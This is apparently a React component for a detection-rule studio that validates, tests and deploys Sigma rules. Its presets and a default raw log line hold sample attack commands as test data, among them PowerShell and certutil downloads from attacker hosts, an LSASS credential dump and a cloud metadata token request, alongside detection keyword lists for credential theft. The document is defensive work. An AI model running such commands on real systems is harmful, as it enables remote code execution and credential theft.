import React, { useState, useEffect } from "react";
import Button from "./ui/Button";
import Badge from "./ui/Badge";
import { validateSigmaRule, testSigmaRule, saveSigmaRule } from "../api";
import { hasPermission } from "../auth";

const RULE_PRESETS = [
  {
    name: "⚡ Suspicious PowerShell Download Cradle",
    desc: "Detects PowerShell downloading and executing remote scripts via WebClient or DownloadString",
    yaml: `title: Suspicious PowerShell Download Cradle
id: sigma_powershell_download_cradle
status: production
description: Detects in-memory execution of remote scripts via WebClient download cradles
level: high
tags:
    - attack.execution
    - attack.t1059.001
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        process: powershell.exe
        commandline:
            - DownloadString
            - WebClient
            - Net.WebClient
            - IEX
    condition: selection
`,
    sample: {
      host: "WIN-PROD-01",
      user: "Administrator",
      process: "powershell.exe",
      commandline: "powershell.exe -w hidden -nop -c (New-Object Net.WebClient).DownloadString('http://194.26.29.112/payload.ps1') | IEX",
      ip: "194.26.29.112",
    },
  },
  {
    name: "🔑 LSASS Memory Dump / Mimikatz",
    desc: "Detects unauthorized dumping of LSASS process memory for plaintext credential extraction",
    yaml: `title: OS Credential Access via LSASS Dumping
id: sigma_lsass_dumping_mimikatz
status: production
description: Detects process memory access targeting lsass.exe for credential harvesting
level: critical
tags:
    - attack.credential_access
    - attack.t1003
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        commandline:
            - "sekurlsa::logonpasswords"
            - "lsadump::sam"
            - "procdump.exe -ma lsass"
            - "comsvcs.dll #24"
    condition: selection
`,
    sample: {
      host: "DC-PRIMARY-01",
      user: "SYSTEM",
      process: "rundll32.exe",
      commandline: "rundll32.exe C:\\windows\\System32\\comsvcs.dll #24 644 C:\\temp\\lsass.dmp full",
      ip: "10.0.1.15",
    },
  },
  {
    name: "🚨 Multiple Failed Logins (Brute Force)",
    desc: "Detects repeated failed authentication attempts indicative of credential stuffing",
    yaml: `title: Multiple Failed Logins Brute Force Storm
id: sigma_brute_force_storm
status: production
description: Detects repeated failed logins from external IP addresses
level: high
tags:
    - attack.credential_access
    - attack.t1110
logsource:
    category: authentication
    product: linux
detection:
    selection:
        commandline:
            - "failed login"
            - "authentication failure"
            - "invalid user"
    condition: selection
`,
    sample: {
      host: "edge-gateway-01",
      user: "root",
      process: "sshd",
      commandline: "sshd: Failed password for invalid user admin from 185.220.101.5 port 42810 ssh2",
      ip: "185.220.101.5",
    },
  },
  {
    name: "🛡️ Living-off-the-Land Binary Abuse (LOLBins)",
    desc: "Detects abuse of native Windows utilities like certutil, bitsadmin, or wmic",
    yaml: `title: Living-off-the-Land Binary Proxy Execution
id: sigma_lolbin_abuse_certutil
status: production
description: Detects certutil downloading external payloads masquerading as certificates
level: medium
tags:
    - attack.defense_evasion
    - attack.t1218
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        process: certutil.exe
        commandline:
            - "-urlcache"
            - "-split"
            - "http"
    condition: selection
`,
    sample: {
      host: "FINANCE-PC-4",
      user: "accounting_user",
      process: "certutil.exe",
      commandline: "certutil.exe -urlcache -split -f http://evil-server.org/beacon.exe C:\\temp\\update.exe",
      ip: "198.51.100.44",
    },
  },
  {
    name: "☁️ Cloud Metadata SSRF Exfiltration",
    desc: "Detects internal network requests targeting AWS/GCP/Azure link-local metadata endpoints",
    yaml: `title: Cloud Metadata Service SSRF Probe
id: sigma_cloud_metadata_ssrf
status: production
description: Detects access attempts to 169.254.169.254 metadata services
level: critical
tags:
    - attack.credential_access
    - attack.t1552
logsource:
    category: web_access
    product: cloud
detection:
    selection:
        commandline:
            - "169.254.169.254"
            - "latest/meta-data"
            - "computeMetadata/v1"
    condition: selection
`,
    sample: {
      host: "k8s-ingress-prod",
      user: "www-data",
      process: "curl",
      commandline: "curl -s -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600' http://169.254.169.254/latest/api/token",
      ip: "169.254.169.254",
    },
  },
];

export default function SigmaRuleStudio({ initialRuleYaml = "", onNavigateToMatrix }) {
  const [yamlContent, setYamlContent] = useState(
    initialRuleYaml || RULE_PRESETS[0].yaml
  );
  const [selectedPresetIdx, setSelectedPresetIdx] = useState(0);

  // Validation states
  const [validating, setValidating] = useState(false);
  const [validationResult, setValidationResult] = useState(null);
  const [validationErrors, setValidationErrors] = useState([]);

  // Testing states
  const [testMode, setTestMode] = useState("sample"); // "sample", "raw", "recent"
  const [sampleEvent, setSampleEvent] = useState(RULE_PRESETS[0].sample);
  const [rawLogLine, setRawLogLine] = useState(
    "powershell.exe -nop -enc JABzACAAPQAgAE4AZQB3... (New-Object Net.WebClient).DownloadString('http://evil.com/x')"
  );
  const [testing, setTesting] = useState(false);
  const [testResult, setTestResult] = useState(null);

  // Deployment states
  const [deploying, setDeploying] = useState(false);
  const [deployMessage, setDeployMessage] = useState("");
  const [deployError, setDeployError] = useState("");

  const canDeploy = hasPermission("rules.write") || hasPermission("events.write");

  useEffect(() => {
    if (initialRuleYaml) {
      setYamlContent(initialRuleYaml);
    }
  }, [initialRuleYaml]);

  const handleSelectPreset = (idx) => {
    setSelectedPresetIdx(idx);
    const preset = RULE_PRESETS[idx];
    setYamlContent(preset.yaml);
    setSampleEvent(preset.sample);
    setValidationResult(null);
    setValidationErrors([]);
    setTestResult(null);
    setDeployMessage("");
    setDeployError("");
  };

  const handleValidate = async () => {
    setValidating(true);
    setValidationResult(null);
    setValidationErrors([]);
    try {
      const res = await validateSigmaRule(yamlContent);
      if (res.data.valid) {
        setValidationResult(res.data);
      } else {
        setValidationErrors(res.data.errors || ["Validation failed."]);
      }
    } catch (err) {
      const errs =
        (err.response && err.response.data && err.response.data.errors) || [
          err.message || "Failed to validate rule syntax.",
        ];
      setValidationErrors(errs);
    } finally {
      setValidating(false);
    }
  };

  const handleTest = async () => {
    setTesting(true);
    setTestResult(null);
    try {
      const payload = { yaml: yamlContent };
      if (testMode === "sample") {
        payload.sample_event = sampleEvent;
      } else if (testMode === "raw") {
        payload.sample_raw = rawLogLine;
      } else {
        payload.use_recent_events = true;
      }

      const res = await testSigmaRule(payload);
      setTestResult(res.data);
    } catch (err) {
      const msg =
        (err.response && err.response.data && err.response.data.errors) || [
          err.message || "Rule dry-run evaluation failed.",
        ];
      setValidationErrors(msg);
    } finally {
      setTesting(false);
    }
  };

  const handleDeploy = async () => {
    if (!window.confirm("Deploy this rule into the active detection engine?")) {
      return;
    }
    setDeploying(true);
    setDeployMessage("");
    setDeployError("");
    try {
      const res = await saveSigmaRule(yamlContent);
      setDeployMessage(
        res.data.message || "Rule deployed successfully to active engine!"
      );
    } catch (err) {
      const msg =
        (err.response && err.response.data && err.response.data.message) ||
        err.message ||
        "Failed deploying rule.";
      setDeployError(msg);
    } finally {
      setDeploying(false);
    }
  };

  return (
    <div style={{ display: "flex", flexDirection: "column", gap: 20 }}>
      {/* Top Controls Banner */}
      <div
        style={{
          display: "flex",
          justifyContent: "space-between",
          alignItems: "center",
          flexWrap: "wrap",
          gap: 16,
          background: "var(--bg-2)",
          border: "1px solid var(--line)",
          padding: "16px 20px",
          borderRadius: 12,
        }}
      >
        <div>
          <div style={{ display: "flex", alignItems: "center", gap: 10 }}>
            <span style={{ fontSize: "1.3rem" }}>⚡</span>
            <h2 style={{ margin: 0, fontSize: "1.2rem", fontWeight: 700 }}>
              Sigma Rule Studio &amp; Live Tester
            </h2>
            <Badge tone="ok">Live Engine Sandbox</Badge>
          </div>
          <p
            style={{
              margin: "6px 0 0",
              fontSize: "0.85rem",
              color: "var(--color-text-muted)",
            }}
          >
            Author, lint, and dry-run Sigma &amp; native detection rules against
            simulated payloads and live telemetry.
          </p>
        </div>

        {/* Preset Selector */}
        <div style={{ display: "flex", alignItems: "center", gap: 10 }}>
          <label
            style={{
              fontSize: "0.82rem",
              fontWeight: 600,
              color: "var(--color-text-muted)",
            }}
          >
            Templates:
          </label>
          <select
            value={selectedPresetIdx}
            onChange={(e) => handleSelectPreset(Number(e.target.value))}
            style={{
              background: "var(--bg-1)",
              color: "var(--text)",
              border: "1px solid var(--line)",
              padding: "8px 12px",
              borderRadius: 8,
              fontSize: "0.85rem",
              cursor: "pointer",
            }}
          >
            {RULE_PRESETS.map((p, idx) => (
              <option key={idx} value={idx}>
                {p.name}
              </option>
            ))}
          </select>
        </div>
      </div>

      {/* Main Two-Column Layout */}
      <div
        style={{
          display: "grid",
          gridTemplateColumns: "repeat(auto-fit, minmax(460px, 1fr))",
          gap: 20,
        }}
      >
        {/* Left Column: YAML Code Editor */}
        <div
          style={{
            background: "var(--bg-2)",
            border: "1px solid var(--line)",
            borderRadius: 12,
            display: "flex",
            flexDirection: "column",
            overflow: "hidden",
          }}
        >
          <div
            style={{
              padding: "12px 16px",
              background: "rgba(0,0,0,0.2)",
              borderBottom: "1px solid var(--line)",
              display: "flex",
              justifyContent: "space-between",
              alignItems: "center",
            }}
          >
            <div style={{ display: "flex", alignItems: "center", gap: 8 }}>
              <span style={{ fontSize: "0.8rem", fontWeight: 700, textTransform: "uppercase", letterSpacing: "0.05em", color: "var(--color-text-muted)" }}>
                detection_rule.yml
              </span>
              <Badge tone="neutral">YAML</Badge>
            </div>
            <div style={{ display: "flex", gap: 8 }}>
              <Button
                size="sm"
                variant="secondary"
                onClick={handleValidate}
                disabled={validating}
              >
                {validating ? "Checking..." : "✓ Validate Schema"}
              </Button>
              <Button
                size="sm"
                tone="ok"
                onClick={handleDeploy}
                disabled={deploying || !canDeploy}
                title={
                  !canDeploy
                    ? "Analyst or Admin role required to deploy rules."
                    : "Deploy rule into active detection engine"
                }
              >
                {deploying ? "Deploying..." : "🚀 Deploy Rule"}
              </Button>
            </div>
          </div>

          <textarea
            value={yamlContent}
            onChange={(e) => {
              setYamlContent(e.target.value);
              setValidationResult(null);
              setValidationErrors([]);
            }}
            rows={22}
            spellCheck={false}
            style={{
              width: "100%",
              boxSizing: "border-box",
              padding: "16px",
              fontFamily: "'JetBrains Mono', 'Fira Code', Consolas, Monaco, monospace",
              fontSize: "0.88rem",
              lineHeight: 1.5,
              background: "var(--bg-1)",
              color: "var(--text)",
              border: "none",
              resize: "vertical",
              outline: "none",
            }}
          />

          {/* Validation Feedback Banner */}
          {validationResult && (
            <div
              style={{
                padding: "12px 16px",
                background: "rgba(62, 224, 162, 0.08)",
                borderTop: "1px solid rgba(62, 224, 162, 0.3)",
                display: "flex",
                alignItems: "center",
                justifyContent: "space-between",
                flexWrap: "wrap",
                gap: 8,
              }}
            >
              <div style={{ display: "flex", alignItems: "center", gap: 8 }}>
                <span style={{ color: "#3ee0a2", fontWeight: 700 }}>✓ Valid Rule:</span>
                <span style={{ fontSize: "0.85rem" }}>
                  Format: <strong>{validationResult.format.toUpperCase()}</strong> ({validationResult.rule_count} compiled rule)
                </span>
              </div>
              {validationResult.rules && validationResult.rules[0] && (
                <div style={{ display: "flex", gap: 6 }}>
                  <Badge tone="danger">
                    {validationResult.rules[0].severity?.toUpperCase()}
                  </Badge>
                  {validationResult.rules[0].technique_id && (
                    <Badge tone="warn">
                      {validationResult.rules[0].technique_id}
                    </Badge>
                  )}
                </div>
              )}
            </div>
          )}

          {validationErrors.length > 0 && (
            <div
              style={{
                padding: "12px 16px",
                background: "rgba(255, 92, 122, 0.08)",
                borderTop: "1px solid rgba(255, 92, 122, 0.3)",
              }}
            >
              <div style={{ color: "#ff5c7a", fontWeight: 700, fontSize: "0.85rem", marginBottom: 4 }}>
                ⚠️ Validation Errors ({validationErrors.length}):
              </div>
              <ul style={{ margin: 0, paddingLeft: 20, fontSize: "0.82rem", color: "#ff5c7a" }}>
                {validationErrors.map((err, i) => (
                  <li key={i}>{err}</li>
                ))}
              </ul>
            </div>
          )}

          {deployMessage && (
            <div
              style={{
                padding: "12px 16px",
                background: "rgba(62, 224, 162, 0.12)",
                color: "#3ee0a2",
                fontWeight: 600,
                fontSize: "0.85rem",
                borderTop: "1px solid #3ee0a2",
              }}
            >
              {deployMessage}
            </div>
          )}

          {deployError && (
            <div
              style={{
                padding: "12px 16px",
                background: "rgba(255, 92, 122, 0.12)",
                color: "#ff5c7a",
                fontWeight: 600,
                fontSize: "0.85rem",
                borderTop: "1px solid #ff5c7a",
              }}
            >
              {deployError}
            </div>
          )}
        </div>

        {/* Right Column: Live Dry-Run Test Workbench */}
        <div
          style={{
            background: "var(--bg-2)",
            border: "1px solid var(--line)",
            borderRadius: 12,
            display: "flex",
            flexDirection: "column",
            overflow: "hidden",
          }}
        >
          {/* Header with Mode Tabs */}
          <div
            style={{
              padding: "12px 16px",
              background: "rgba(0,0,0,0.2)",
              borderBottom: "1px solid var(--line)",
              display: "flex",
              justifyContent: "space-between",
              alignItems: "center",
              flexWrap: "wrap",
              gap: 10,
            }}
          >
            <div style={{ display: "flex", alignItems: "center", gap: 8 }}>
              <span style={{ fontSize: "0.8rem", fontWeight: 700, textTransform: "uppercase", letterSpacing: "0.05em", color: "var(--color-text-muted)" }}>
                Live Test Console
              </span>
            </div>

            <div style={{ display: "flex", gap: 4, background: "var(--bg-1)", padding: 3, borderRadius: 8 }}>
              <button
                type="button"
                onClick={() => setTestMode("sample")}
                style={{
                  background: testMode === "sample" ? "var(--bg-3)" : "transparent",
                  color: testMode === "sample" ? "var(--text)" : "var(--color-text-muted)",
                  border: "none",
                  padding: "4px 8px",
                  borderRadius: 6,
                  fontSize: "0.75rem",
                  fontWeight: 600,
                  cursor: "pointer",
                }}
              >
                Sample Event
              </button>
              <button
                type="button"
                onClick={() => setTestMode("raw")}
                style={{
                  background: testMode === "raw" ? "var(--bg-3)" : "transparent",
                  color: testMode === "raw" ? "var(--text)" : "var(--color-text-muted)",
                  border: "none",
                  padding: "4px 8px",
                  borderRadius: 6,
                  fontSize: "0.75rem",
                  fontWeight: 600,
                  cursor: "pointer",
                }}
              >
                Raw Log Line
              </button>
              <button
                type="button"
                onClick={() => setTestMode("recent")}
                style={{
                  background: testMode === "recent" ? "var(--bg-3)" : "transparent",
                  color: testMode === "recent" ? "var(--text)" : "var(--color-text-muted)",
                  border: "none",
                  padding: "4px 8px",
                  borderRadius: 6,
                  fontSize: "0.75rem",
                  fontWeight: 600,
                  cursor: "pointer",
                }}
              >
                Live SIEM Stream
              </button>
            </div>
          </div>

          <div style={{ padding: "16px", display: "flex", flexDirection: "column", gap: 14 }}>
            {testMode === "sample" && (
              <div style={{ display: "flex", flexDirection: "column", gap: 10 }}>
                <div style={{ fontSize: "0.78rem", fontWeight: 700, textTransform: "uppercase", color: "var(--color-text-muted)" }}>
                  Mock Event Attributes:
                </div>
                <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 8 }}>
                  <div>
                    <label style={{ fontSize: "0.72rem", color: "var(--color-text-muted)" }}>Process Image</label>
                    <input
                      type="text"
                      value={sampleEvent.process || ""}
                      onChange={(e) => setSampleEvent({ ...sampleEvent, process: e.target.value })}
                      style={{
                        width: "100%",
                        padding: "6px 10px",
                        background: "var(--bg-1)",
                        border: "1px solid var(--line)",
                        color: "var(--text)",
                        borderRadius: 6,
                        fontSize: "0.82rem",
                        fontFamily: "monospace",
                      }}
                    />
                  </div>
                  <div>
                    <label style={{ fontSize: "0.72rem", color: "var(--color-text-muted)" }}>User Account</label>
                    <input
                      type="text"
                      value={sampleEvent.user || ""}
                      onChange={(e) => setSampleEvent({ ...sampleEvent, user: e.target.value })}
                      style={{
                        width: "100%",
                        padding: "6px 10px",
                        background: "var(--bg-1)",
                        border: "1px solid var(--line)",
                        color: "var(--text)",
                        borderRadius: 6,
                        fontSize: "0.82rem",
                      }}
                    />
                  </div>
                </div>
                <div>
                  <label style={{ fontSize: "0.72rem", color: "var(--color-text-muted)" }}>Command Line Arguments</label>
                  <textarea
                    rows={3}
                    value={sampleEvent.commandline || ""}
                    onChange={(e) => setSampleEvent({ ...sampleEvent, commandline: e.target.value })}
                    style={{
                      width: "100%",
                      padding: "8px 10px",
                      background: "var(--bg-1)",
                      border: "1px solid var(--line)",
                      color: "var(--text)",
                      borderRadius: 6,
                      fontSize: "0.82rem",
                      fontFamily: "monospace",
                    }}
                  />
                </div>
              </div>
            )}

            {testMode === "raw" && (
              <div>
                <label style={{ fontSize: "0.78rem", fontWeight: 700, textTransform: "uppercase", color: "var(--color-text-muted)" }}>
                  Paste Raw Syslog / Terminal Log:
                </label>
                <textarea
                  rows={6}
                  value={rawLogLine}
                  onChange={(e) => setRawLogLine(e.target.value)}
                  placeholder="Paste a raw command line or syslog payload..."
                  style={{
                    width: "100%",
                    marginTop: 6,
                    padding: "10px",
                    background: "var(--bg-1)",
                    border: "1px solid var(--line)",
                    color: "var(--text)",
                    borderRadius: 6,
                    fontSize: "0.82rem",
                    fontFamily: "monospace",
                  }}
                />
              </div>
            )}

            {testMode === "recent" && (
              <div style={{ padding: "16px", background: "rgba(86, 198, 255, 0.05)", border: "1px solid rgba(86, 198, 255, 0.2)", borderRadius: 8 }}>
                <div style={{ fontSize: "0.85rem", fontWeight: 600, color: "#56c6ff" }}>
                  📡 Live Event Pipeline Mode
                </div>
                <p style={{ margin: "4px 0 0", fontSize: "0.8rem", color: "var(--color-text-muted)" }}>
                  Will execute this draft rule in-memory across the 20 most recently ingested log events in the database.
                </p>
              </div>
            )}

            <Button
              onClick={handleTest}
              disabled={testing}
              tone="primary"
              style={{ width: "100%", marginTop: 6 }}
            >
              {testing ? "Evaluating Rule..." : "⚡ Run Live Dry-Run Test"}
            </Button>
          </div>

          {/* Test Results Banner */}
          {testResult && (
            <div
              style={{
                marginTop: "auto",
                borderTop: "1px solid var(--line)",
                padding: "16px",
                background: testResult.matched
                  ? "rgba(255, 92, 122, 0.08)"
                  : "rgba(62, 224, 162, 0.06)",
              }}
            >
              <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: 10 }}>
                <div style={{ display: "flex", alignItems: "center", gap: 8 }}>
                  <Badge tone={testResult.matched ? "danger" : "ok"}>
                    {testResult.matched ? "🚨 MATCH DETECTED" : "✓ NO MATCH / BENIGN"}
                  </Badge>
                  <span style={{ fontSize: "0.82rem", color: "var(--color-text-muted)" }}>
                    {testResult.match_count} match(es) in {testResult.evaluated_events_count} event(s)
                  </span>
                </div>
                <div style={{ fontSize: "0.78rem", color: "var(--color-text-muted)", fontFamily: "monospace" }}>
                  ⏱️ {testResult.execution_time_ms} ms
                </div>
              </div>

              {testResult.matches && testResult.matches.length > 0 && (
                <div style={{ display: "flex", flexDirection: "column", gap: 8 }}>
                  {testResult.matches.map((m, idx) => (
                    <div
                      key={idx}
                      style={{
                        padding: "8px 12px",
                        background: "var(--bg-1)",
                        border: "1px solid var(--line)",
                        borderRadius: 6,
                        fontSize: "0.8rem",
                      }}
                    >
                      <div style={{ display: "flex", justifyContent: "space-between", marginBottom: 4 }}>
                        <strong>{m.rule_id}</strong>
                        <Badge tone="danger">{m.severity?.toUpperCase()}</Badge>
                      </div>
                      <div style={{ color: "var(--color-text-muted)", marginBottom: 4 }}>
                        {m.description}
                      </div>
                      <div style={{ fontFamily: "monospace", fontSize: "0.75rem", background: "rgba(0,0,0,0.3)", padding: "4px 8px", borderRadius: 4 }}>
                        {m.matched_event?.commandline || m.matched_event?.process}
                      </div>
                    </div>
                  ))}
                </div>
              )}
            </div>
          )}
        </div>
      </div>
    </div>
  );
}
